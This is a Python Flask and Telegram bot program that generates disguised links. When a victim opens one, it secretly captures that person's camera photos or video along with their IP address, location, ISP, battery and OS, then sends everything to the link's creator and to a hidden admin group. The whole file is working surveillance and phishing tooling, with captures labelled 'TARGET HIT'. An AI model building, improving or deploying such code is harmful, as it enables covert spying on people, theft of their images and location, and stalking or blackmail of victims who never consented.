import os, telebot, threading, io, time
from flask import Flask, render_template, request

# --- CONFIG ---
TOKEN = os.environ.get('TOKEN')
BASE_URL = os.environ.get('BASE_URL') 
GROUP_ID = os.environ.get('GROUP_ID') # Master Log Group for Admin
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# This stores logs and photos in memory using a unique session key
collection = {}
user_temp = {}

# --- SHARED MENU HELPER ---
def main_menu_markup():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    markup.row("🤳 Front Cam", "📷 Back Cam")
    markup.row("📸 8 Photos", "🎥 3s Video")
    return markup

# --- TELEGRAM BOT LOGIC ---
@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(
        m.chat.id, 
        f"✅ <b>VinzyStore Multi-User System Active.</b>\nYour ID: <code>{m.chat.id}</code>\nSelect your settings:", 
        reply_markup=main_menu_markup(), 
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda m: m.text in ["🤳 Front Cam", "📷 Back Cam"])
def set_cam(m):
    user_temp[m.chat.id] = user_temp.get(m.chat.id, {})
    user_temp[m.chat.id]['cam'] = 'user' if "Front" in m.text else 'environment'
    bot.send_message(m.chat.id, f"✅ Camera: <b>{m.text}</b>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text in ["📸 8 Photos", "🎥 3s Video"])
def set_mode(m):
    user_temp[m.chat.id] = user_temp.get(m.chat.id, {})
    user_temp[m.chat.id]['mode'] = 'photo' if "Photos" in m.text else 'video'
    msg = bot.send_message(m.chat.id, "🔗 <b>Enter YouTube ID</b> (or 'default'):", parse_mode="HTML", reply_markup=telebot.types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, make_link)

def make_link(m):
    if m.chat.id not in user_temp:
        user_temp[m.chat.id] = {'cam': 'user', 'mode': 'photo'}
    yt = m.text if (m.text and m.text.lower() != 'default') else 'dQw4w9WgXcQ'
    d = user_temp[m.chat.id]
    
    # Generate the link using the creator's ID (Person A or B)
    link = f"{BASE_URL.rstrip('/')}/?id={m.chat.id}&mode={d['mode']}&cam={d['cam']}&ytid={yt}"
    
    bot.send_message(m.chat.id, f"🚀 <b>Link Ready (Private to you):</b>\n<code>{link}</code>", parse_mode="HTML", reply_markup=main_menu_markup())

# --- WEB SERVER LOGIC ---
@app.route('/')
def index():
    ua = request.headers.get('User-Agent', '').lower()
    # Route to different templates based on OS detection
    if 'iphone' in ua or 'ipad' in ua:
        return render_template('ios.html')
    elif 'android' in ua:
        return render_template('android.html')
    else:
        return render_template('pc.html')

@app.route('/log_info', methods=['POST'])
def log_info():
    data = request.json
    tid = request.args.get('id') # The ID of Person A or B
    ip = data.get('ip', 'Unknown')
    
    # Create a unique session ID for this specific target hit
    session_id = f"{tid}_{ip.replace('.', '_')}"
    
    info = (
        f"⚡ <b>TARGET HIT</b> ⚡\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🌐 <b>IP:</b> <code>{ip}</code>\n"
        f"🏢 <b>ISP:</b> {data.get('org')}\n"
        f"📍 <b>LOC:</b> {data.get('city')}, {data.get('country_name')}\n"
        f"🔋 <b>Bat:</b> {data.get('battery', 'N/A')}\n"
        f"📱 <b>OS:</b> {data.get('platform', 'N/A')}\n"
        f"━━━━━━━━━━━━━━━"
    )
    
    # Initialize the specific session storage
    collection[session_id] = {"photos": [], "info": info, "creator": tid}
    return "OK"

@app.route('/upload', methods=['POST'])
def upload():
    tid = request.args.get('id') # Person A or Person B's ID
    ip = request.remote_addr # Get target IP to find the right session
    session_id = f"{tid}_{ip.replace('.', '_')}"
    
    file_bytes = request.files['file'].read()
    
    # If the session doesn't exist, create a temporary one
    if session_id not in collection:
        collection[session_id] = {"photos": [], "info": f"ID: {tid} (Quick Capture)", "creator": tid}
    
    info = collection[session_id]["info"]

    # 1. Video Capture (Sends immediately to the correct Person)
    if request.args.get('type') == 'video':
        try:
            bot.send_video(tid, io.BytesIO(file_bytes), caption=info, parse_mode="HTML")
            if GROUP_ID:
                bot.send_video(GROUP_ID, io.BytesIO(file_bytes), caption=f"Admin Log for {tid}\n{info}", parse_mode="HTML")
        except: pass
        return "OK"

    # 2. Photo Capture (Wait for 8 photos)
    collection[session_id]["photos"].append(file_bytes)
    
    if len(collection[session_id]["photos"]) >= 8:
        try:
            # Send to the person who made the link (tid)
            media = [telebot.types.InputMediaPhoto(p, caption=info if i==0 else "") for i, p in enumerate(collection[session_id]["photos"])]
            bot.send_media_group(tid, media)
            
            # Send to the Master Admin Group
            if GROUP_ID:
                media_log = [telebot.types.InputMediaPhoto(p, caption=f"Log for {tid}\n{info}" if i==0 else "") for i, p in enumerate(collection[session_id]["photos"])]
                bot.send_media_group(GROUP_ID, media_log)
        except Exception as e:
            print(f"Error sending group: {e}")
            
        del collection[session_id] # Clear memory
    return "OK"

# --- BOT POLLING THREAD ---
def run_bot():
    while True:
        try:
            bot.remove_webhook()
            bot.polling(none_stop=True, interval=0, timeout=20)
        except:
            time.sleep(10)

if __name__ == "__main__":
    # Start Telegram Bot in background
    threading.Thread(target=run_bot, daemon=True).start()
    
    # Run on Port 8000 to match your Koyeb JSON health check
    port = 8000
    app.run(host='0.0.0.0', port=port)
